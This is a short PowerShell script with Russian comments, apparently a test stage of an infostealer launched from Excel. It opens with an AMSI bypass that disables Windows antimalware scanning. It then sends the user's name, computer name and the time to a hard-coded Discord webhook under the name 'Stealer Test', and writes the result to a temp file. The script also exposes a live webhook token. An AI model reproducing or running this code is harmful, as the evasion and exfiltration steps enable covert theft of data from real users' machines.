# === ФИНАЛЬНЫЙ ПРОСТОЙ ТЕСТ ДЛЯ DISCORD ===
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$webhook = "https://discord.com/api/webhooks/1464644525132742688/Nklo9KcxdCsJF4wn7QX7JkqT5w4diK_iax_V1m_zoFJtStdrYBF6-FYsjSakPULKJW0T"

$body = @"
{
"content": "✅ ТЕСТ ИЗ EXCEL УСПЕШНО ЗАПУЩЕН\nПользователь: $($env:USERNAME)\nПК: $($env:COMPUTERNAME)\nВремя: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')",
"username": "Stealer Test"
}
"@

try {
Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 15
"✅ Отправлено успешно в Discord" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Force
}
catch {
"❌ Ошибка $($_.Exception.Response.StatusCode): $($_.Exception.Message)" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Force
if ($_.ErrorDetails) {
"Детали: $($_.ErrorDetails.Message)" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Append
}
}

"Тест завершён: $(Get-Date)" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Append
# force update
